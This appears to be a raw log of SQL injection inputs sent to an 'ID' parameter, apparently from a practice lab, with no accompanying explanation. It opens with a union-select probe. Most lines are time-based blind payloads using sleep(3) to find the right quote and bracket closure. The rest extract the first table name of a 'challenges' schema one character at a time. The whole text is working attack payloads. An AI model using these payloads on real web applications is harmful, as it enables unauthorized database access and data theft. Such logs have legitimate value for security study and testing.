ID:1
ID:10
ID:-1' union select 1,2,3 -- 
ID:1'
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1' and if(left(user(),1)='a',0,sleep(3)) #
ID:1' and if(left(user(),1)='a',0,sleep(3)) #
ID:1
ID:1" and if(left(user(),1)='a',0,sleep(3)) #
ID:1" and if(left(user(),1)='a',0,sleep(3)) #
ID:1") and if(left(user(),1)='a',0,sleep(3)) #
ID:1') and if(left(user(),1)='a',0,sleep(3)) #
ID:1 and if(left(user(),1)='a',0,sleep(3)) #
ID:1') and if(left(user(),1)='a',0,sleep(3)) #
ID:1')) and if(left(user(),1)='a',0,sleep(3)) #
ID:1) and if(left(user(),1)='a',0,sleep(3)) #
ID:1") and if(left(user(),1)='a',0,sleep(3)) #
ID:1")) and if(left(user(),1)='a',0,sleep(3)) #
ID:1")) and if(left(user(),1)='a',0,sleep(3)) #
ID:1")) and if(left(user(),1)='a',0,sleep(3)) #
ID:1")) and if(left(user(),1)='a',0,sleep(3)) #
ID:1")) and if(left(user(),1)='a',0,sleep(3)) #
ID:1")) and if(left(user(),1)='a',0,sleep(3)) #
ID:1"") and if(left(user(),1)='a',0,sleep(3)) #
ID:1"" and if(left(user(),1)='a',0,sleep(3)) #
ID:1'') and if(left(user(),1)='a',0,sleep(3)) #
ID:1)) and if(left(user(),1)='a',0,sleep(3)) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'a') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'b') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'c') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'd') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'e') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'f') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'g') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'h') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'i') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'j') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'k') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'l') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'm') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'n') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'o') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'p') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'q') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'r') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 's') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 't') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'u') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'v') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'w') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'x') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'y') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'z') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'A') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'B') , sleep(3) , 0) #
ID:1)) and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'C') , sleep(3) , 0) #
